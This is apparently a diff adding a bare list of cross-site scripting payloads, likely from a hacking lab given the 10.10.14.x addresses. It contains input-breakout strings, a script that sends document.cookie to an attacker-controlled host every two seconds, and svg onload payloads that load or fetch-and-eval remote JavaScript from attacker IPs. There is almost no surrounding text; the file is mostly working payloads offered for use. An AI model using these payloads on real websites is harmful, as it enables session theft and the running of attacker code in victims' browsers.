@@ -1,0 +1,28 @@
+$("p").html("Sin cuenta? <a href=\"register.php\">Ir Aqui</a> ");
+
+
+value="$("p").html("Sin cuenta? <a href=\"register.php\">Ir Aqui</a> ");"
+
+value=""
+
+"/><script>$("p").html("Sin cuenta? <a href=\"register.php\">Ir Aqui</a> ");</script>
+
+"/><script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.14.45:4848/?".concat(document.cookie)},2000)</script>
+
+
+<svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//10.10.14.45:9923";d.body.appendChild(z)},0)>
+
+"/><svg onload='setInterval(function(){d=document;z=d.createElement(“script”);z.src=”//10.10.14.169:9023”;d.body.appendChild(z)},2000)'>   
+
+<svg/onload='fetch("//10.10.14.169:9023").then(r=>r.text().then(t=>eval(t)))'>
+<script src=14.rs>
+// you can also specify an arbitrary payload with 14.rs/#payload
+e.g: 14.rs/#alert(document.domain)
+
+
+"/><svg/onload='fetch("//10.10.14.169:9023").then(r=>r.text().then(t=>eval(t)))'>
+
+
+"><script></script>
+
+"/><svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//10.10.14.45:8987'},2000)>
